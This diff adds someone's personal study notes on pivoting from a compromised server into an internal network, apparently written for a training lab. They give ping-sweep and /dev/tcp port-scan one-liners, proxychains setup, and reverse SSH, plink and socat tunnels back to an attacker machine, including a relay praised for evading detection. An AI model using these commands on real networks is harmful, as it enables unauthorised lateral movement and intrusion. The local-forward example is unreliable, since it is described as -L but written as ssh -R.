@@ -1,0 +1,414 @@
+
+
+Day 1
+======
+
+
+Recap:
+	- We have root access to a public facing server... Now it's time to pivot our access to other machines on the system.
+
+Starting with pivoting
+------------------------
+	
+	The art of extending access from one machine to another machine is known as pivoting.
+
+- This can also be taken as a way to interacting an orgs internal network by a public facing server. (hack into public facing server and then pivot your access to other internal machines.)
+
+
+Overview of pivoting
+---------------------
+
+To bypass the IDS and firewalls for pivoting access there can be 2 ways in doing that..
+
+	- Tunnelling/Proxying
+	- Port Forwarding
+
+Note: There is not difference between the 2: In other terms, port forwarding is at a little basic level where you just forward one port to another,  inside a network.
+	- Whereas tunneling and proxying is, where you make a connection via some other host in the network.
+
+- Tunnelling is good if we want to redirect a lot of data from a node to other node.
+	- Whereas port forwarding is faster and more reliable, but do note that it allows only a single port (or a range of ports) to be forwarded.
+
+Note: Which style of pivoting to proceed with, depends on the network structure... 
+
+	- As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.
+
+
+Coming up next:
+	- Enumerating a network using native and already compiled tools.
+	- Proxychains/FoxyProxy
+	- SSH port forwarding and tunneling (mostly on unix)
+	- plink.exe (windows)
+	- socat (win + unix)
+	- chisel (win + unix)
+	- sshuttle (currently available for unix only)
+
+Note: This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.
+
+
+Enumeration
+============
+
+There are five possible ways to enumerate a network through a compromised host:
+
+    Using material found on the machine. The hosts file or ARP cache, for example
+    Using pre-installed tools
+    Using statically compiled tools
+    Using scripting techniques
+    Using local tools through a proxy
+
+Note: These are written in order of preference, like enumerating using a local tools through a proxy, is v slow.
+
+Using material found on the host and pre-installed tools
+----------------------------------------------------------
+
+	To check the arp table on windows and linux:
+		- arp -a
+
+	Similarly to check for hosts file in windows and linux you can view them in:
+		- C:\Windows\System32\drivers\etc\hosts
+		and 
+		- /etc/hosts
+
+		repectively
+
+Note: /etc/resolv.conf on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into).
+
+	- On windows to check the DNS information we can use:
+		- ipconfig /all
+
+	- For linux also we can run the following command rather than reading through the resolv.conf file. 
+		- nmcli dev show
+
+Use of static binaries
+-----------------------
+
+If not all the tools are installed, we can use static binaries from our machine and transfer it to the host.
+
+About static and dynamic binaries:
+	- The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (.so files on Linux, or .dll files on Windows) -- these are referred to as "dynamic" programs.
+	- Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run.
+
+A good list of already statically compiled binaries is here: https://github.com/andrew-d/static-binaries
+
+Scanning through a proxy
+--------------------------
+
+This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). 
+	- The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.
+
+Manual Script Scanning for enumeration
+---------------------------------------
+
+- Nmap is most likely to be installed on the server, for testing purposes, but if not... you may need to manually code out a script for discovering hosts, on a network and port scanning them.
+
+Bash one-liner to discover hosts on a network:
+	for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+
+- The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible
+
+
+Bash one liner to scan for ports of a host on the network:
+	for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+
+Note: There are going to be chances that the firewall has blocked the ping requests to host (mostly cases in windows boxes). But this is least of our worries while pivoting as the firewalls generally blocks pings to external network.
+	- If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
+
+Proxychains and FoxyProxy
+==========================
+
+Proxychains are useful when working with CLI. To work with browser tools we can use foxyproxy.
+
+Proxychains:
+	- It is a tool which allows us to make a connection to a host lying somewhere on it's internal network to us outside it's network.
+
+To invoke a proxy connection for a tool using proxychains, just prepend it to the command.
+
+	- eg. proxychains nc <ip> <port>
+
+Also, you must have noticed that we are not using a port to connect with the proxy, just a nc connection to an ip at a particular port on that host.
+
+	- This is because proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:
+
+    	- The current directory (i.e. ./proxychains.conf)
+    	- ~/.proxychains/proxychains.conf
+    	- /etc/proxychains.conf
+
+
+-This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: cp /etc/proxychains.conf ., then make any changes to the config file in a copy stored in your current directory. 
+
+- If you're likely to move directories a lot then you could instead place it in a .proxychains directory under your home directory, achieving the same results. 
+
+	Note: If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from here.
+
+
+proxychains.conf
+------------------
+
+There are 2 things that are worth noting in this config file:
+	- "ProxyList" section
+		- It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 for a Tor entrypoint
+	
+	- "proxy_dns" line
+		- We should comment out the line containing this, before initiating an nmap scan as this option can cause the scan to hang and ultimately crash.
+
+
+Other things to note about proxychains:
+	- Only TCP can be used with proxychains no UDP/SYN scans would work. Also ping scan will also not work with proxychains.
+
+	- Even if using nmap locally through, do it with a static copy ( i.e. using the script engine) to reduce some latency... Other than the fact this is going to be EXTREMELY SLOWW AND IS NOT RECOMMENDED.
+
+
+FoxyProxy
+-----------
+
+About browsing using proxy... this can be a great tool with ease of access.
+
+	Setting up the proxy in foxyproxy is easy, and has been done many times, so no tut for that.
+
+Note:
+	- Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.
+
+
+SSH Tunneling / Port Forwarding
+=================================
+
+Now, there are 2 types of connections:
+	- Forward (local)
+	- Reverse (remote)
+
+
+FORWARDING
+-----------
+
+
+- To create a local port forward... we use -L flag with the following syntax: 
+
+	ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@TARGET_IP -fN
+
+- -fN flag is used concatenated for 2 things... -f used to switch to background shell and -N specifying that no commands will be sent through this ssh connection.
+
+Proxy connection
+------------------
+- To create a proxy connection we use a rather simple command with -D switch. Syntax is as follows:
+	- ssh -D 1337 user@TARGET_IP -fN
+
+	- Use of -D flag will open a forward connection on port 1337 (attacker machine).
+
+	- This port can now be used to manage all the interaction on the host machine to attacker machine.
+		- Make sure the port you use here, is CORRECTLY CONFIGURED TO USE THE PROXYCHAINS.
+
+REVERSE
+--------
+
+
+- To create a reverse connection, you would need a pair of ssh-keys then transfer you pub key into authorized_keys and then try to get a reverse connection.
+
+IMPORTANT NOTE:
+	- On a new line, type the following line, then paste in the public key:
+
+	command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+
+	This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
+
+	The final entry in the authorized_keys should look like this:
+		command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZZRJm3UNae0HMjbWrvetBcFTgZd8xPtxVbiLnvqYRphINllCzPvUTe8Dk2IBCwgNAs4ZSZ2E5lYV0G4TrgAq0lijY9S8BdTj0bIGFYKxOIf+vj5GqxYHfojZ9OcZzF2WuArfPkXPKnvK0ezLIHFcVPCWANXKLPozzf5dZnNpVbuUw3w3qeeaEIL5GJVefN7J/q3D3YQlrqYZCGjRHzoz0O1p/JkGLCkYG7cUeZz+kCa6uMsW8J2bmAOdT4pHn/519YOD1uyN97mUMK2MTXIN8wORT6yUDp9yzVQ4zd38RSx1+cPj6Y5Eq5fWWyvt8xr/wYL3qupz89N1TV3i1v1WXuHTdFTbUjlIzTeT7zQu8hLtFDfgfdZqh3Rx5+1vLRhAqobRndibVVyE8mQEz4BRXwE557ZxZ+Sv/9OA8s/ClmrLVWAwE0CUzkQvgvRnaFkHppcUzbSefV6/JI8AgD5eqma1NVcYlvcdC27tx/VgmUFeK8JECTBIg7bmVr3gS8gk= j4x0n@0verflaw
+
+	Then start the ssh service on your localhost.
+
+- Also, before we make a reverse connection we need to pass on the private key (make sure you generate a fake pair of keys to transfer; just so that no one could get a reverse shell back to you) to the host machine. 
+
+	ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+	(Note: To execute the above command on the victim's machine)
+
+	-To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
+		
+		ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
+
+
+Remote Proxy Connection
+-------------------------
+
+- Another thing you can do is create a reverse connection from the box using a proxy...
+
+	ssh -R 1337 user@attackermachine -i keyfile -fN
+
+Note: This may not work in older clients...
+
+Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.
+
+
+plink.exe
+-----------
+
+Plink.exe is nothing but an alternative tool for openssh on windows. We can get the reverse ssh shells in the very same way we get it in linux.
+	- In short it is a cli version of putty on windows...
+
+cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
+
+	/c flag is used for specifying a command with cmd.exe. (like iex (invoke expression) with powershell).
+
+	That echo y command is run, in order to bypass any warning message thrown by windows (in case it occurs this will stop the reverse connection initiated).
+
+Ex: If we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:
+	cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
+
+Note: ssh keys generated with ssh-keygen cannot be directly used with plink we first need to convert it into putty's format... 
+	- We can do this by using puttygen (found in package putty-tools)
+
+		sudo apt install putty-tools
+
+	- Once the package is installed we can invoke the puttygen to convert the keys from openssh format to putty format.
+
+		puttygen KEYFILE -o OUTPUT_KEY.ppk
+
+Note: The files for putty's ssh have an extension of .ppk and after the conversion they can be transferred to windows machine for a reverse ssh connection.
+
+Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) before a new engagement is sensible.
+
+
+Socat
+-------
+
+For pivoting:
+	- Attacker machine
+	- Compromised Server: The server that we have control over
+	- Target Server: The server we want to establish a connection through the compromised server via pivoting.
+
+
+
+- To my fav tools, socat.
+
+- No intro needed.
+
+- We can use http.server in python3 to pass the static socat binary to the compromised machine... and then run it to create relays.
+
+- To create a simple reverse connection from the compromised machine to out machine, we can use: 
+
+	nc -lvnp 8001 (attacker machine)
+
+	./socat tcp-l:8000 tcp:attacking_ip:8001 &
+
+	This will open a listening port (8000) on the compromised machine and connect to our attacking machine.
+
+Note: Remember to background the process so that we could get our shell session back.
+
+- So similarly for a port forward through socat, all we gotta do is chain the reverse shells from attacker machine to target machine via compromised machine.
+
+
+Port Forwarding: Easy
+
+	- Now there are 2 methods to port forward using socat. One is this, the easy one... The other is smarter and help us disguise the the port connection so it is hard for port scanner to detect the activity going on ports.
+
+	Also, remember that we can always use an encrypted socat connection (ref: What the shell room).
+
+		./socat tcp-l:33060,fork,reuseaddr tcp:target_ip:3306 &
+
+	- So here, socat creates a connection listening on port 33060 on the compromised machine (to which our (attacker) ip connects to).
+		- And then forward the connection received to target_ip on port 3306. Easy peasy.
+
+		- fork; it is used to put ever connection into a new process.
+		- reuseaddr; It was used to specify the  reuse of same address(i.e. to keep on listening at the same port for more connection from our attacker machine)
+			- Later the process was background to get the shell back.
+
+Port Forwarding: Quiet
+
+	THIS IS GENIUUUUUUSSSSS. SUCH A COOL TRICK... GOTTA TRY OUT DEFINITELYYYYY
+		- Relying on relay-ing the network request from attacker machine to target machine (AWESOME PIVOTINGG). Though this ones a little complex (I wish if I could note this down as a flow chart).
+
+Note: Here we are creating a local port relay on both(attacker and compromised machines)
+
+	Here, we create 2 connections (1 on attacker and another on  compromised).
+
+	- On the attacker machine we listen on 2 ports, thus creating a local relay.
+
+		./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+
+		- And it is because of this relay that we are able to forward the connection from each other.
+
+	- Next, on the compromised relay server we execute this command:
+		
+		./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+
+		- Here we are initiating 2 connections... 1 to our attacker machine and other to our target machine on the target we want to interact with.
+			- We did used fork here, so we could send multiple request to the server without waiting for a response(making it less laggy).
+
+		- Here is another local relay that passes on the connection received from the attacker machine to target machine.
+
+	About this complex connection
+	------------------------------
+
+		- After a successful creation of the connection whatever command we sent on port 8000 or 8001 (NOTE THAT BOTH THE PORTS ARE FORWARDING CONNECTION THROUGH A LOCAL RELAY AND THUS THEY ARE IN SYNC WITH EACH OTHER) will be received by the compromised machine and forwarded on to the target ip's target port.
+
+		- For any responses, the loop works in reverse... i.e. the compromised server listens from the target port and forwards the response to the attacker's 8001 port (WHICH CAN BE RELAYED ON TO PORT 8000).
+
+Note: We have now achieved the same thing as previously, but without opening any ports on the server! THEREFORE THERE ARE NO PORTS OPEN ON THE COMPROMISED SERVER NOR ON ANY INTERNAL NETWORK THAT MAY LEAD TO ANY SORT OF SUSPICIOUN.F-ing GENIOUSSS. ISN'T IT??
+
+Optional: Try to create the same process using an SSL tunnel.
+
+
+Chisel
+--------
+
+You can find the chisel's release binaries(static) on it's github here: https://github.com/jpillora/chisel/releases
+
+	- To be done someday later.
+
+sshuttle
+---------
+
+- This tool will only work on linux machines...
+
+- This tool is quite different from the tools we discovered so far... Unlike a direct port forward or creating a proxy chain... This tool actually creates a reverse ssh tunnel automatically in easy steps.
+	- This can be actually looked at as a VPN connection for the shell. That it grants your attacker machine to be a part of another internal network. And once you're on their internal network... You can execute commands to interact as a machine of their own.
+
+- Tbh, this tool does nothing other than creating an ssh-tunnel with which we can access any machine inside on an internal network.
+	- Yes, you can background the connection using &. If you see a line like ```c : Connected to server.``` that means you're connected to the server.
+
+	- Else if you see something like the following lines:
+
+		client: Connected.
+		client_loop: send disconnect: Broken pipe
+		client: fatal: server died with error code 255
+
+		- This means the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
+
+			To get around this, we tell sshuttle to exlude the compromised server from the subnet range using the -x switch.
+
+
+- This is actually a preferred tool to use than setting up a manual reverse tunneling in ssh:
+	- Easy and steady ssh tunnel
+	- Gives your machine complete access to the internal network, therefore, port scanning and other tools can be ready-made available and reduces the work of transferring them and executing it on other machines as the attacker machine is itself a part of it.
+
+
+	Tech Details
+	--------------
+
+	- Installation can be done via apt (sudo apt install sshuttle).
+
+	- To invoke the reverse connection:
+
+		sshuttle -r username@address subnet &
+
+		Eg. sshuttle -r user@172.16.0.5 172.16.0.0/24 &
+
+	Note: If you're not sure about the subnet it uses... You can also use -N option which will try to attempt identifying the subnet automatically.
+
+		sshuttle -r user@address -N &
+
+	Note: If the server doesn't allows password authentication and only accepts key-based authentication. Tbh, the sshuttle doesn't support key authentication yet...
+
+		- But to bypass this limitation we can use --ssh-cmd switch and then specifying the priv-key to authenticate when the connection request is done. This is simple af.
+
+		sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" -N
+
+Conclusion
+-----------
+
+- There are a great many interesting techniques which we haven't had time to cover here:
+	- On a fully rooted target, it's possible to use the installed firewall -- e.g. iptables or Windows Firewall -- to create entry points into an otherwise inaccessible network. 
+
+	- Equally, it's possible to set up a route manually in the routing table of your attacking machine to, routing your traffic into the target network without requiring a proxy-tool like Proxychains or Foxyproxy.
+
+Research in free time is highly recommended on the above 2 topics.
